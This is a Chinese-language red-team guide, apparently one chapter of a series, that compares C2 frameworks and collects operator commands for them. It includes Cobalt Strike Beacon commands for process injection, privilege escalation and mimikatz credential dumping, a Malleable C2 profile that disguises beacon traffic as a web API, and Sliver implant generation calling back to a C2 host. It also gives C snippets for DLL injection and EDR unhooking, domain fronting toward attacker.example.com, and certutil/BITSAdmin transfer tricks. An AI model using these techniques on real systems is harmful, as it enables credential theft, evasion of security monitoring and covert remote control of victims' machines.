# C2 框架对比与选型

> 红队 C2（Command & Control）框架深度对比

---

## 主流 C2 框架一览

| 框架 | 语言 | 协议 | 价格 | 推荐场景 |
|------|------|------|------|---------|
| Cobalt Strike | Java/PS | HTTP/S/DNS/SMB | $3.5K+/年 | 企业红队（工业标准）|
| Havoc | Go/C | HTTP/S/SMB | 免费开源 | Cobalt Strike 替代 |
| Sliver | Go | HTTP/S/DNS/mTLS | 免费开源 | 多平台红队 |
| Brute Ratel | Go | HTTP/S | $2.5K/永久 | EDR 绕过强项 |
| Mythic | Python/Go | HTTP/S/WebSocket | 免费开源 | 可定制化 |
| Nighthawk | C++ | HTTP/S | 定制 | APT 模拟 |
| Covenant | C#/.NET | HTTP/S | 免费开源 | Windows 环境 |

---

## 1. Cobalt Strike 核心操作

### Beacon 管理
```bash
# Cobalt Strike 团队服务器
./teamserver <IP> <password> [profile]

# Beacon 类型:
# - HTTP Beacon: http-get + http-post
# - HTTPS Beacon: 证书 + 加密通道
# - DNS Beacon: 低速但稳定 (txt/mx 记录)
# - SMB Beacon: 内网横向 (命名管道)

# Beacon 命令速查
beacon> sleep 5 1           # 交互间隔 + jitter
beacon> inject <PID> x64    # 进程注入
beacon> spawn x64           # 新建进程 + 注入
beacon> elevate svc-exe     # 提权
beacon> mimikatz sekurlsa::logonpasswords
beacon> hashdump            # 导出本地哈希
beacon> net domain          # 域信息
```

### Malleable C2 Profile
```c
# malleable-c2.profile — 流量伪装配置
set sleeptime "5000";        # 5 秒基础间隔
set jitter "20";             # ±20% 随机抖动
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
set uri "/api/v1/analytics/"; # 伪装为 Web API

http-get {
    set uri "/api/v1/analytics/track";
    client {
        header "Accept" "application/json";
        metadata {
            base64url;
            prepend "__metadata";
            print;
        }
    }
    server {
        header "Content-Type" "application/json";
        output {
            print;
        }
    }
}
```

---

## 2. Sliver (开源替代)

```bash
# Sliver 服务端
sliver-server

# 生成 Implant
generate --http example.com --os windows --arch amd64 --format exe
generate --mtls 10.0.0.5:8888 --os linux --save /tmp/

# 会话管理
sliver > sessions
sliver > use <session-id>
sliver (IMPLANT) > info
sliver (IMPLANT) > ps
sliver (IMPLANT) > execute whoami

# 横向移动
sliver (IMPLANT) > execute-assembly /tmp/SharpHound.exe -c All
sliver (IMPLANT) > sideload /tmp/mimikatz.exe "sekurlsa::logonpasswords"

# BOF 支持 (兼容 Cobalt Strike BOF)
sliver > bof /tmp/enum_filter.bof
```

---

## 3. EDR 绕过策略

### 进程注入技术
```c
// 经典 DLL 注入
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteMemory, dllPath, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);

// 现代替代: 进程镂空 (PPID Spoofing)
// 创建挂起进程 → 写入恶意代码 → 恢复执行
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
```

### API Unhooking
```c
// EDR 通过 Hook ntdll.dll 监控 API 调用
// 绕过方法: 从磁盘读取干净的 ntdll.dll 并重映射

HANDLE hFile = CreateFile("C:\\Windows\\System32\\ntdll.dll", ...);
HANDLE hMapping = CreateFileMapping(hFile, ...);
LPVOID pCleanNtdll = MapViewOfFile(hMapping, ...);
// 将干净的 .text 段覆盖到内存中（去除 EDR Hook）
```

### 间接系统调用
```c
// 直接 syscall 绕过 ntdll Hook
// 通过读取 ntdll.dll 提取 syscall 号 (SSN)
// 直接执行 syscall 指令,不经过 Hooked API

// Sliver/Havoc 内置: syscall 自动提取 + 加密
```

---

## 4. 通信层隐蔽

### 域前置 (已被封堵)
```bash
# CDN 域前置原理: 
# SNI = cdn.example.com (可信任 CDN)
# Host = attacker.example.com (C2 服务器)
# 大部分 CDN (CloudFront/Azure) 已修复此漏洞
```

### 现代替代方案
```yaml
隐蔽通信方式:
  - HTA (HTML Application): .hta 文件 + JS/VBScript
  - XSL Transform: wmic process call create via XSL
  - MSBuild inline task: 通过 XML 编译执行 C# 代码
  - Certutil: Windows 内置 Base64 编解码传输
  - BITSAdmin: Windows 后台传输服务
  - SSH Tunneling: 反向 SSH 隧道 (端口转发)
```

---

*上一篇：[红队基础设施架构](03-red-team-infra.md)*
